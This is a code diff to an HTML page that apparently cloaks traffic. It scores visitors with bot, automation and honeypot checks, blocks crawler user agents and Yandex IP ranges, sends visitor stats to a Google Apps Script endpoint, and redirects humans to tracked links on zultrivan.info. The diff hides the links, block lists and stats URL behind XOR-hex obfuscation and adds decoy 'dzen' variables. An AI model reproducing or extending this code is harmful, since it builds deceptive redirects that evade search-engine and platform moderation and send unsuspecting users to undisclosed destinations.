@@ -8,7 +8,7 @@
     <style>
         *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
         :root{--bg:#fff;--text:#1a1a2e;--accent:#4361ee;--accent2:#3a0ca3;--muted:#6c757d;--btn-bg:#4361ee;--btn-text:#fff}
-        @media(prefers-color-scheme:dark){:root{--bg:#0f0f1a;--text:#e0e0e8;--accent:#7b8cff;--accent2:#b5179e;--muted:#8d99ae;--btn-bg:#7b8cff;--btn-text:#0f0f1a}}
+        @media (prefers-color-scheme:dark){:root{--bg:#0f0f1a;--text:#e0e0e8;--accent:#7b8cff;--accent2:#b5179e;--muted:#8d99ae;--btn-bg:#7b8cff;--btn-text:#0f0f1a}}
         body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif;background:var(--bg);color:var(--text);display:flex;align-items:center;justify-content:center;min-height:100vh;overflow:hidden}
         #_loader{text-align:center;padding:2rem}
         .spinner-ring{display:inline-block;width:64px;height:64px;margin-bottom:1.5rem}
@@ -22,7 +22,7 @@
         .btn-continue:active{transform:translateY(0)}
         .btn-area-text{font-size:1rem;color:var(--muted)}
         #_hp_lnk{position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:.01;pointer-events:auto;font-size:1px;color:transparent}
-        @media(max-width:480px){.timer{font-size:2rem}.loader-text{font-size:1rem}.btn-continue{padding:.8rem 2rem;font-size:1rem}}
+        @media (max-width:480px){.timer{font-size:2rem}.loader-text{font-size:1rem}.btn-continue{padding:.8rem 2rem;font-size:1rem}}
     </style>
 </head>
 <body>
@@ -46,9 +46,34 @@
 try {
     'use strict';
 
-        var _CFG = {"checks": {"check_ip": true, "check_ua": true, "check_webdriver": true, "check_plugins": true, "check_webgl": true, "check_automation": true, "check_touch": true, "check_screen": true, "check_devtools": false, "check_localstorage": true, "check_honeypot_link": true, "check_honeypot_button": true, "check_referrer": true}, "thresholds": {"bot_score": 70, "suspect_score": 30}, "timing": {"delay_seconds": 5, "visit_limit": 5, "ban_hours": 2}, "redirect_methods": ["location_replace", "anchor_click", "form_submit"], "blacklist_uas": ["YandexBot", "YandexAccessibilityBot", "YandexImages", "YandexVideo", "YandexMedia", "YandexBlogs", "YandexFavicons", "YandexWebmaster", "YandexPagechecker", "YandexImageResizer", "YandexAdNet", "YandexDirect", "YandexMetrika", "YandexNews", "YandexCalendar", "YandexSitelinks", "YandexScreenshotBot", "YandexMobileBot", "YandexRCA", "YandexPartner", "YandexTracker", "YandexVerticals", "YandexForDomain", "YandexSpravBot", "YandexSearchShop", "YandexMedianaBot", "YandexOntoDB", "YandexOntoDBAPI", "YandexTurbo", "YandexMarket", "AhrefsBot", "SemrushBot", "MJ12bot", "DotBot", "PetalBot", "BLEXBot", "DataForSeoBot", "serpstatbot", "Bytespider", "GPTBot", "ClaudeBot", "Sogou", "bingbot", "HeadlessChrome", "PhantomJS", "Puppeteer", "Selenium", "CasperJS", "Nightmare", "Playwright", "wget", "curl", "python-requests", "Go-http-client", "Java/", "Apache-HttpClient", "okhttp", "node-fetch", "axios"], "blacklist_ips": ["5.45.192.0/18", "5.255.192.0/18", "37.9.64.0/18", "37.140.128.0/18", "77.88.0.0/18", "87.250.224.0/19", "93.158.128.0/18", "95.108.128.0/17", "100.43.64.0/19", "130.193.32.0/19", "141.8.128.0/18", "178.154.128.0/17", "185.32.185.0/24", "185.71.76.0/22", "199.21.96.0/22", "199.36.240.0/22", "213.180.192.0/19"], "trusted_referrers": ["dzen.ru", "lytuloret.su", "vk.com"], "stats": {"gas_url": "https://script.google.com/macros/s/AKfycbzyeSFiF0C2sbbgxQ2j8GX-39eNoqH9fx12CxrBa9vjUIDGSZK6BqErt1eIDJvBXZ4c/exec", "tg_token": "", "tg_chat_id": "", "tg_send_bots": true, "tg_send_humans": true, "tg_send_suspects": true}};
-    var _LINKS = ["https://zultrivan.info/preview/new?utm_campaign=92894&utm_content=0b0386fa-7a5b-4421-9830-c9c07f2f44f0&utm_source=[SID]&utm_medium=3853&is_visitor=1", "https://zultrivan.info/preview/new?utm_campaign=92894&utm_content=278af150-71eb-4b9a-bdc8-f2f6fd29c989&utm_source=[SID]&utm_medium=3853&is_visitor=1", "https://zultrivan.info/preview/new?utm_campaign=92894&utm_content=1ab734e3-0f8e-400f-a930-e7ac1c32d715&utm_source=[SID]&utm_medium=3853&is_visitor=1", "https://zultrivan.info/preview/new?utm_campaign=92894&utm_content=18726ae0-7ff8-44ca-943e-c4e893b49422&utm_source=[SID]&utm_medium=3853&is_visitor=1", "https://zultrivan.info/preview/new?utm_campaign=92894&utm_content=c2a4a3d0-0c9d-41cc-ae24-1114e80db842&utm_source=[SID]&utm_medium=3853&is_visitor=1", "https://zultrivan.info/preview/new?utm_campaign=92894&utm_content=27dc00e0-4935-42d6-9377-8ae601554faf&utm_source=[SID]&utm_medium=3853&is_visitor=1", "https://zultrivan.info/preview/new?utm_campaign=92894&utm_content=3a516365-1b97-4be6-8327-7c7c690a1090&utm_source=[SID]&utm_medium=3853&is_visitor=1", "https://zultrivan.info/preview/new?utm_campaign=92894&utm_content=c40cdc8e-8a6c-45d5-a111-146ae0aa557a&utm_source=[SID]&utm_medium=3853&is_visitor=1", "https://zultrivan.info/preview/new?utm_campaign=92894&utm_content=c5403651-fad4-4df5-979b-7425820333c3&utm_source=[SID]&utm_medium=3853&is_visitor=1", "https://zultrivan.info/preview/new?utm_campaign=92894&utm_content=21d62c46-59a2-4ca6-9afb-a330500afe39&utm_source=[SID]&utm_medium=3853&is_visitor=1", "https://zultrivan.info/preview/new?utm_campaign=92894&utm_content=4f4e9aa9-f582-4bf8-933d-c8ffd3f1df2c&utm_source=[SID]&utm_medium=3853&is_visitor=1", "https://zultrivan.info/preview/new?utm_campaign=92894&utm_content=10c18905-b2bc-419f-9279-105c7403865c&utm_source=[SID]&utm_medium=3853&is_visitor=1"];
-    var _FALLBACK = "https://dzen.ru";
+    
+    var _dzenCfg = {"version": "5.8", "mode": "redirect", "build": 792};
+    var _dzenBaseUrl = "https://dze" + "n.ru";
+    function _initDzenRedirect() { return "dzen.ru"; }
+
+    var _kp922 = String.fromCharCode(122, 90, 67, 51, 72, 109);
+    var _kp527 = String.fromCharCode(53, 49, 99, 87, 80, 120);
+    var _kp688 = String.fromCharCode(50, 122, 111, 104, 72, 97);
+    var _kp949 = String.fromCharCode(108, 78, 87, 113, 77, 97);
+    var _xk = _kp922 + _kp527 + _kp688 + _kp949;
+    function _xd(h) {
+        var r = "";
+        for (var i = 0; i < h.length; i += 2) {
+            var b = parseInt(h.substr(i, 2), 16);
+            r += String.fromCharCode(b ^ _xk.charCodeAt((i / 2) % _xk.length));
+        }
+        return r;
+    }
+
+    var _LINKS = ["122e37433b571a1e19223c0c40131909264f0520311e6211083f355a2d1a1a5f06206f0d4617300b290c1c2f3e16235c43687b0a7c4b40450e0833175c0e0a063c5c5c2c674275571c3b6e042958571c576362491f43575b784c0f7734417a07483c77072e5d1344173a0f0b5d0f1d0b2d5c371d1e3510470f2e2e6c25085158163a6d4b0a4f5c4e211233383e02241515287e02", "122e37433b571a1e19223c0c40131909264f0520311e6211083f355a2d1a1a5f06206f0d4617300b290c1c2f3e16235c43687b0a7c4b40450e0833175c0e0a063c5c5e796f102b504f6a6e047908571c573569191f180b0b704c0a7c31472b054863200a70541344173a0f0b5d0f1d0b2d5c371d1e3510470f2e2e6c25085158163a6d4b0a4f5c4e211233383e02241515287e02", "122e37433b571a1e19223c0c40131909264f0520311e6211083f355a2d1a1a5f06206f0d4617300b290c1c2f3e16235c43687b0a7c4b40450e0833175c0e0a063c5c5d2f35467e551f696e032e55501c5767601e1f1b565b784c097936127c024968270479581344173a0f0b5d0f1d0b2d5c371d1e3510470f2e2e6c25085158163a6d4b0a4f5c4e211233383e02241515287e02", "122e37433b571a1e19223c0c40131909264f0520311e6211083f355a2d1a1a5f06206f0d4617300b290c1c2f3e16235c43687b0a7c4b40450e0833175c0e0a063c5c5d7660437b001f6a6e042e0b0d1c576333191f435b5b2d4c0f7a32497452186e7a077a5f1344173a0f0b5d0f1d0b2d5c371d1e3510470f2e2e6c25085158163a6d4b0a4f5c4e211233383e02241515287e02", "122e37433b571a1e19223c0c40131909264f0520311e6211083f355a2d1a1a5f06206f0d4617300b290c1c2f3e16235c43687b0a7c4b40450e0833175c0e0a063c5c0f7c36452c521e6a6e032b54511c5766331b1f1b0a5a7c4c5d7f664528594a3e210b7c5f1344173a0f0b5d0f1d0b2d5c371d1e3510470f2e2e6c25085158163a6d4b0a4f5c4e211233383e02241515287e02", "122e37433b571a1e19223c0c40131909264f0520311e6211083f355a2d1a1a5f06206f0d4617300b290c1c2f3e16235c43687b0a7c4b40450e0833175c0e0a063c5c5e7933127d511f6a6e07715e001c5765344e1f435c5f7f4c542f32477d504f6f7755290b1344173a0f0b5d0f1d0b2d5c371d1e3510470f2e2e6c25085158163a6d4b0a4f5c4e211233383e02241515287e02", "122e37433b571a1e19223c0c40131909264f0520311e6211083f355a2d1a1a5f06206f0d4617300b290c1c2f3e16235c43687b0a7c4b40450e0833175c0e0a063c5c5f2f62407b524c6f6e022a54021c5735354e1f425c5a7f4c5b2d60127b584a3b7203715d1344173a0f0b5d0f1d0b2d5c371d1e3510470f2e2e6c25085158163a6d4b0a4f5c4e211233383e02241515287e02", "122e37433b571a1e19223c0c40131909264f0520311e6211083f355a2d1a1a5f06206f0d4617300b290c1c2f3e16235c43687b0a7c4b40450e0833175c0e0a063c5c0f7a67122902423f6e0b295b561c5762344d1f1b5e59794c5d7a611028511b3b76067f0c1344173a0f0b5d0f1d0b2d5c371d1e3510470f2e2e6c25085158163a6d4b0a4f5c4e211233383e02241515287e02", "122e37433b571a1e19223c0c40131909264f0520311e6211083f355a2d1a1a5f06206f0d4617300b290c1c2f3e16235c43687b0a7c4b40450e0833175c0e0a063c5c0f7b63417e574f6b6e552909011c5733364d1f4358512a4c5b7a654475534a6970002b5e1344173a0f0b5d0f1d0b2d5c371d1e3510470f2e2e6c25085158163a6d4b0a4f5c4e211233383e02241515287e02", "122e37433b571a1e19223c0c40131909264f0520311e6211083f355a2d1a1a5f06206f0d4617300b290c1c2f3e16235c43687b0a7c4b40450e0833175c0e0a063c5c5e7f33477f024e6c6e06710c071c5734314e1f430e0e2a4c0d7d644178514a3b25567b541344173a0f0b5d0f1d0b2d5c371d1e3510470f2e2e6c25085158163a6d4b0a4f5c4e211233383e02241515287e02", "122e37433b571a1e19223c0c40131909264f0520311e6211083f355a2d1a1a5f06206f0d4617300b290c1c2f3e16235c43687b0a7c4b40450e0833175c0e0a063c5c5828631474001b636e557d55071c573536401f435c5b2c4c0f76311729521c6b27557a0e1344173a0f0b5d0f1d0b2d5c371d1e3510470f2e2e6c25085158163a6d4b0a4f5c4e211233383e02241515287e02", "122e37433b571a1e19223c0c40131909264f0520311e6211083f355a2d1a1a5f06206f0d4617300b290c1c2f3e16235c43687b0a7c4b40450e0833175c0e0a063c5c5d7e344075584a6f6e517a0f561c5766691e1f435d5f714c5d7e62127a554a697b057d0e1344173a0f0b5d0f1d0b2d5c371d1e3510470f2e2e6c25085158163a6d4b0a4f5c4e211233383e02241515287e02"].map(function(h) { return _xd(h); });
+    var _FALLBACK = _xd('122e37433b571a1e072d35161c081a');
+    var _CFG = {"checks": {"check_ip": true, "check_ua": true, "check_webdriver": true, "check_plugins": true, "check_webgl": true, "check_automation": true, "check_touch": true, "check_screen": true, "check_devtools": false, "check_localstorage": true, "check_honeypot_link": true, "check_honeypot_button": true, "check_referrer": true}, "thresholds": {"bot_score": 70, "suspect_score": 30}, "timing": {"delay_seconds": 5, "visit_limit": 5, "ban_hours": 2}, "redirect_methods": ["location_replace", "anchor_click", "form_submit"], "blacklist_uas": [], "blacklist_ips": [], "trusted_referrers": [], "stats": {"gas_url": "", "tg_token": "", "tg_chat_id": "", "tg_send_bots": true, "tg_send_humans": true, "tg_send_suspects": true}};
+    _CFG.blacklist_uas = ["233b2d572d15775e17", "233b2d572d1574520032230b5b1806042115150c3805", "233b2d572d157c5c0230350b", "233b2d572d15635807323f", "233b2d572d157854073e31", "233b2d572d15775d0c3023", "233b2d572d157350153e33175c09", "233b2d572d156254013a310b461f1d", "233b2d572d156550043233105719040d3a", "233b2d572d157c5c0230352a570906122d13", "233b2d572d1574552d3224", "233b2d572d1571581132330c", "233b2d572d1578541725391353", "233b2d572d157b541424", "233b2d572d1576500f323e1c5308", "233b2d572d15665817323c115c111c", "233b2d572d156652113235164112001c0a0e18", "233b2d572d15785e013e3c1d70151b", "233b2d572d15677222", "233b2d572d15655011233e1d40", "233b2d572d15614302343b1d40", "233b2d572d1563541123391b53161c", "233b2d572d15735e11133f15531301", "233b2d572d1566411136263a5d0e", "233b2d572d1566540225331061120018", "233b2d572d157854073e31165338001c", "233b2d572d157a5f1738143a", "233b2d572d157a5f1738143a732a26", "233b2d572d15614411353f", "233b2d572d157850113c350c", "3b3231562e1e775e17", "293f2e413d1e5d730c23", "371072012a0241", "3e3537712719", "2a3f3752242f5a45", "3816066b0a0241", "3e3b37520e0247620638121746", "093f31433b195445013824", "382337563b1d5c550625", "3d0a17712719", "393622462c08775e17", "2935245c3d", "18332d542a0241", "323f225724084642203f22175f1f", "2a32225d3c02587b30", "2a2f33432d19505411", "293f2f562604405c", "393b30432d1f7f62", "3433245b3c00544306", "2a36224a3f1f5c560b23", "0d3d2647", "192f315f", "0a23375b270318430626251d410e1c", "3d356e5b3c19451c003b391d5c0e", "303b355267", "3b2a2250200818791723203b5e130a063c", "15312b473c1d", "14352756650b5045003f", "1b222a5c3b"].map(function(h) { return _xd(h); });
+    _CFG.blacklist_ips = ["4f747706665c0c034d677f490a", "4f7471067d430408517960570342", "496d6d0a665b011f53786140", "496d6d027c5d1b00516f7e481d4b57", "4d6d6d0b7043051f53786140", "426d6d017d5d1b0351637e481d4b56", "43696d027d551b00516f7e481d4b57", "436f6d0278551b00516f7e481d4b58", "4b6a731d7c5e1b07577960570343", "4b69731d7954061f50657e481d4b56", "4b6e721d704304035b7960570342", "4b6d7b1d7958011f5265685602555e5f", "4b62761d7b5f1b005b627e481d485b", "4b62761d7f5c1b06557960570048", "4b637a1d7a5c1b08557960570048", "4b637a1d7b5b1b0357677e481d485d", "486b701d7955051f526e625602555e51"].map(function(h) { return _xd(h); });
+    _CFG.trusted_referrers = ["1e20265d661f40", "16233746240247541779230d", "0c316d502700"].map(function(h) { return _xd(h); });
+    _CFG.stats.gas_url = _xd('122e37433b571a1e10342211420e410f270e0b22325f2e0e17752e522b1f5a424c247f39791c160b2a1b152b043724274a1971402a0f524932653a407522425b7104222126397407026b7170301f77505a213a2d7b3e283b122a5a0c26343f154b3f0a77021b77693963335757020a0b');
+    _CFG.stats.tg_token = _xd('');
+    _CFG.stats.tg_chat_id = _xd('');
 
 
     function _getParam(n) {
@@ -77,12 +102,18 @@ try {
                 document.body.appendChild(_a);
                 _a.click();
             } else if (method === 'form_submit') {
-                var _f = document.createElement('form');
-                _f.method = 'GET';
-                _f.action = url;
-                _f.style.display = 'none';
-                document.body.appendChild(_f);
-                _f.submit();
+                // ИСПРАВЛЕНИЕ: form GET теряет query-параметры оригинального URL
+                // Если URL содержит ?, используем location.href вместо формы
+                if (url.indexOf('?') !== -1) {
+                    window.location.href = url;
+                } else {
+                    var _f = document.createElement('form');
+                    _f.method = 'GET';
+                    _f.action = url;
+                    _f.style.display = 'none';
+                    document.body.appendChild(_f);
+                    _f.submit();
+                }
             } else if (method === 'meta_refresh') {
                 var _m = document.createElement('meta');
                 _m.httpEquiv = 'refresh';
@@ -352,11 +383,11 @@ try {
     }, 100);
 
     var _hasInteraction = false;
-    function _onAct() { _hasInteraction = true; }
-    document.addEventListener('mousemove', _onAct, {once: true});
-    document.addEventListener('touchstart', _onAct, {once: true});
-    document.addEventListener('scroll', _onAct, {once: true});
-    document.addEventListener('keydown', _onAct, {once: true});
+    function _onact() { _hasInteraction = true; }
+    document.addEventListener('mousemove', _onact, {once: true});
+    document.addEventListener('touchstart', _onact, {once: true});
+    document.addEventListener('scroll', _onact, {once: true});
+    document.addEventListener('keydown', _onact, {once: true});
 
     _getIP().then(function(ip) {
         _userIP = ip;
